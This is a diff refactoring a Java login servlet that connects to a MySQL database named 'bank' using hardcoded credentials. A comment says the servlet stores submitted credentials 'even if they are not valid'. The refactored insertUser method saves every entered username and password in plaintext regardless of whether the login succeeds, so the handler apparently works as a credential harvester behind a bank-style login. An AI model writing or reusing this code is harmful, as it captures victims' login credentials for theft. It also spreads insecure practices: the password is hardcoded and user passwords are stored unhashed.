@@ -15,7 +15,6 @@ import java.sql.SQLException;
 
 @WebServlet("/login")
 public class LoginServlet extends HttpServlet {
-    // Update the database connection details according to your remote MySQL server
     private static final String DB_URL = "jdbc:mysql://192.168.50.23:3306/bank";
     private static final String DB_USER = "king";
     private static final String DB_PASSWORD = "Kusi@123";
@@ -30,24 +29,12 @@ public class LoginServlet extends HttpServlet {
 
         // Store the credentials in the database, even if they are not valid
         try {
-            // Load the MySQL JDBC driver
-            Class.forName("com.mysql.jdbc.Driver");
-
-            // Create a connection to the remote MySQL server
-            Connection connection = DriverManager.getConnection(DB_URL, DB_USER, DB_PASSWORD);
-
-            // Prepare the SQL statement to insert the new user
-            String sql = "INSERT INTO users (username, password) VALUES (?, ?)";
-            PreparedStatement statement = connection.prepareStatement(sql);
-            statement.setString(1, username);
-            statement.setString(2, password);
-
-            // Execute the query
-            statement.executeUpdate();
-
-        } catch (ClassNotFoundException | SQLException e) {
+            // Insert the new user into the database
+            insertUser(username, password);
+        } catch (SQLException e) {
             e.printStackTrace();
-            // Handle the exception and return appropriate response or error message
+            sendErrorResponse(response, "Error inserting user into the database.");
+            return;
         }
 
         // Send response back to client-side JavaScript
@@ -58,32 +45,49 @@ public class LoginServlet extends HttpServlet {
     }
 
     private boolean validateCredentials(String username, String password) {
-        try {
-            // Load the MySQL JDBC driver
-            Class.forName("com.mysql.jdbc.Driver");
+        try (Connection connection = createConnection();
+             PreparedStatement statement = connection.prepareStatement("SELECT COUNT(*) FROM users WHERE username = ? AND password = ?")) {
 
-            // Create a connection to the remote MySQL server
-            Connection connection = DriverManager.getConnection(DB_URL, DB_USER, DB_PASSWORD);
-
-            // Prepare the SQL statement to validate the login credentials
-            String sql = "SELECT COUNT(*) FROM users WHERE username = ? AND password = ?";
-            PreparedStatement statement = connection.prepareStatement(sql);
             statement.setString(1, username);
             statement.setString(2, password);
 
-            // Execute the query
-            ResultSet resultSet = statement.executeQuery();
-
-            // Check if there is a matching user
-            resultSet.next();
-            int count = resultSet.getInt(1);
-            return count > 0;
-
-        } catch (ClassNotFoundException | SQLException e) {
+            try (ResultSet resultSet = statement.executeQuery()) {
+                // Check if there is a matching user
+                resultSet.next();
+                int count = resultSet.getInt(1);
+                return count > 0;
+            }
+        } catch (SQLException e) {
             e.printStackTrace();
             // Handle the exception and return appropriate response or error message
         }
-
         return false;
+    }
+
+    private void insertUser(String username, String password) throws SQLException {
+        try (Connection connection = createConnection();
+             PreparedStatement statement = connection.prepareStatement("INSERT INTO users (username, password) VALUES (?, ?)")) {
+
+            statement.setString(1, username);
+            statement.setString(2, password);
+            statement.executeUpdate();
+        }
+    }
+
+    private Connection createConnection() throws SQLException {
+        try {
+            Class.forName("com.mysql.jdbc.Driver");
+        } catch (ClassNotFoundException e) {
+            throw new SQLException("Failed to load MySQL JDBC driver.");
+        }
+        return DriverManager.getConnection(DB_URL, DB_USER, DB_PASSWORD);
+    }
+
+    private void sendErrorResponse(HttpServletResponse response, String errorMessage) throws IOException {
+        response.setContentType("text/html");
+        PrintWriter out = response.getWriter();
+        out.println("<h1>Error</h1>");
+        out.println("<p>" + errorMessage + "</p>");
+        out.close();
     }
 }
